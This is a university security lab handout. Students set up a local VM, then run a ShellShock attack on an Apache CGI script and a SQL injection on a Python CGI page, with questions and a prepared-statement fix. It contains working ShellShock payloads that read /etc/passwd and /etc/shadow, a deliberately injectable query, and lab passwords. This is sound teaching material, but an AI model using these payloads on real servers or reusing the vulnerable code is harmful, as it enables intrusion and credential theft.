# Web Server Vulnerabilities #

This time we are going to look at some of vulnerabilities of Web servers. In both cases, they are software errors. But each of them are very different.

# Part 1: VirtualBox Setup

For this lab you will run a VirtualBox virtual machine that you can fully configure as a superuser. I have prepared one for you.

Each of the lab machines has access to a shared directory at `/seng/seng360/`. Look for the `vm` folder. In it, you should see three files named `seng360bare.*` and a `Logs` folder. This is the base VM image you will be **copying** from.

You will want to copy that entire VM folder to your local machine's temp directory under your own username. So for example, you would be copying it to `/tmp/user/vm` where **user** is your unix username. You can achieve this with the following:

	mkdir -p /tmp/user/vm
	cp -r /seng/seng360/vm /tmp/user

Move to your new VM directory, and then start up `virtualbox` in command line:

	cd /tmp/user/vm
	virtualbox

At this point, no virtual box is setup up. Go to *File > Preferences* and in the *General* section change the *Default Machine Folder* to point to the directory you created above (i.e. `/tmp/user`). Leave everything else the same.

Now add the virtual machine: Using the menu option *Machine > Add*, select the virtual machine inside your `/tmp/user/vm` directory.

At this point you main screen should be something like this:

![VirtualBox Screen](/lab06/vmBare.png)
  
## Configure the Virtual Machine ##

Make sure that the following ports are been forwarded in the your virtual machine. You can do so by looking under *Settings > Network > Advanced > Port Forwarding*.

| Name | Protocol | Host Port | Guest IP | Guest Port |
|------|----------|-----------|----------|------------|
| HTTP | TCP      | 3080      |          | 80         |
| SSH  | TCP      | 3030      |          | 22         |

- Note: you may encounter a disk image warning from VirtualBox. It should be safe to ignore.

## Start your Virtual Machine ##

Once you run the virtual machine, you should be able to SSH to the virtual machine using port 3080 in the local machine, and the webserver will be running in port 3080. You can test port 3080 by going to [http://localhost:3080](http://localhost:3080)

- See: [http://stackoverflow.com/questions/5906441/how-to-ssh-to-a-virtualbox-guest-externally-through-a-host](http://stackoverflow.com/questions/5906441/how-to-ssh-to-a-virtualbox-guest-externally-through-a-host)

To test if SSH is working do:

	ssh -p 3030 -l user360 localhost

To become root in the virtual machine you will need to use the command `su` (use the root password provided).

| what | user    | password   |
|------|---------|------------|
| user | user360 | user360    |
| root | root    | root360lab |

# Part 2: The ShellShock Bug #

You may have heard of the ShellShock bug from 2014. You can read up on it [here](https://en.wikipedia.org/wiki/Shellshock_%28software_bug%29).

Go to the CERT Coordination Center: [http://cert.org/](http://cert.org/)

**Question 1** What is the purpose of the CERT Coordination Center?

**Question 2** What is a CVE?

**Question 3** What are the CVEs that relate to the ShellShock bug?

Find and read Vulnerability Note [VU#252743](http://www.kb.cert.org/vuls/id/252743). This note will point you to a RedHat blog where the bug is described.

**Question 4** What are the tests for the vulnerabilities in each of the main two CVEs?

Given your answer to **Question 4**, try the two tests to check if `bash` is vulnerable (it is).

# Part 3: Apache Setup #

Your virtual machine is already running Apache on port 80 (port 3080 for this host machine). Apache configuration files are located at `/etc/apache2`

## Enable cgi ##

Make sure you are in superuser mode with `su`. Enable the cgi module using:

	a2enmod cgi

Restart the apache server.

	service apache2 restart

## Create a script to test cgi ##

Create a simple "hello world" script in perl. Test it. Call this script `test.cgi` and place it in the `/usr/lib/cgi-bin` folder. Place it such that you can access it at [http://localhost/cgi-bin/test.cgi](http://localhost/cgi-bin/test.cgi) (if you are in the VM) or [http://localhost:3080/cgi-bin/test.cgi](http://localhost:3080/cgi-bin/test.cgi) (from the host machine) to test it.

```perl
#!/usr/bin/perl
print "Content-type: text/html\n\n";
print "Hello, world!\n";
```

- Resource: [http://www.lies.com/begperl/hello_cgi.html](http://www.lies.com/begperl/hello_cgi.html)
- Note: You'll likely need to edit the test.cgi permissions so that the server can run that file: `chmod 755 test.cgi`
- If necessary, you can inspect the access/error logs of apache. They are located at `/var/log/apache2/error.log`.

## Create a bash script ##

Now that you can run cgi scripts, make a bash script called `test.bash`

```bash
#!/bin/bash
echo "Content-type: text/plain"
echo
echo
echo "Hello world"
whoami
echo "End of the world"
```

Test it.

**Question 5** What user is the one executing the scripts? (see the output of whoami above). Why does apache use that user?

## /etc/passwd and /etc/shadow ##

Read the man page of shadow (`man shadow`). Inspect the files `/etc/passwd` and `/etc/shadow`

**Question 6** Why does Linux maintain `/etc/shadow`?

**Question 7** What is the difference between `/etc/passwd` and `/etc/shadow`?

# Part 4: ShellShocking Attack #

Now we can try the attack.

- Do the following steps outside the virtual machine.

Using `wget` run:

```bash
wget -O /tmp/output.txt -U "() { test;};echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/passwd" http://localhost:3080/cgi-bin/test.bash
```

Test it. What do you get in `output.txt`?

**Question 8** Given your knowledge of the vulnerability, explain how the attack works.

Try it again.

```bash
wget -O /tmp/output.txt -U "() { test;};echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/shadow" http://localhost:3080/cgi-bin/test.bash
```

**Question 9** Explain why this attack didn't work.

**Question 10** What is the vulnerability in the /etc/passwd attack?

# Part 5: Database Setup #

Your user `user360` has a postgres database called `lab5`. Use `psql` to connect to it. Create a table called `test` with the following schema.  

```sql
create table test(
   id integer primary key,
   value integer);
```

Allow anybody `select` to the table `test`:

```sql
grant select on test to public;
```

Insert 10 tuples into the table `test`. The table should looks something like this. Make sure you include a tuple with `id=5`

```
lab5=# select * from test ;
 id | value
----+-------
  1 |    10
  2 |    20
  3 |    30
  4 |    40
  5 |    30
  6 |    40
  7 |    30
  8 |    40
  9 |  1030
 10 |  1040
(10 rows)
```

Create a user called =web= with password =webserver=. See http://www.postgresql.org/docs/9.1/static/app-createuser.html

You will need to do it as user postgres. Do the following (as root):

#+begin_example
su postgres
cd
createuser -P web
#+end_example

Test that the user =web= can connect to the database and see the table

#+begin_example
psql -h localhost -U web lab6
#+end_example

* Python and sql

Use the following python script. It should be able to display the tuple with id value equal 5 (make sure there is one in your table).

#+begin_src python
#!/usr/bin/python

import psycopg2

try:
    conn = psycopg2.connect("dbname='lab5' user='web' host='localhost' password=
'webserver'")
except:
    print "I am unable to connect to the database"

cur = conn.cursor()

id = "5"

try:
    cur.execute("""SELECT * from test where id = """ + id)

except:
    print "I can't SELECT from test"


rows = cur.fetchall()
print "Content-type: text/html";
print ""
print "<h2>Data</h2>"
print "<table border=1>"
for row in rows:
    print "<tr><td>", row[0], '</td><td>', row[1], '</td></tr>'

print "</table>"

#+end_src

** Create a cgi-script

Convert this program into a cgi-script that uses POST method to set the value of =id=. It respond to this request:

See http://www.tutorialspoint.com/python/python_cgi_programming.htm for information on how to do this.

#+begin_example
http://localhost/cgi-bin/sql.py?id=5
#+end_example

** An injection attack

Try now the following URL:

#+begin_example
http://localhost/cgi-bin/sql.py?id=5%20or%20TRUE
#+end_example

*Question 12* What is the result of this query?
*Question 13* Why? (hint, decode the =%20= (it is a character in hexadecimal) then follow the value of id.

** Fix your script

Learn how to protect your script. Hint: lookup /prepared statements/ in Psycogp2

*Question 14* How is the sql injection vulnerability removed?

* What to submit

- Submit your answers to the questions above in a simple text file.
- Submit your python program where you fix the SQL vulnerability
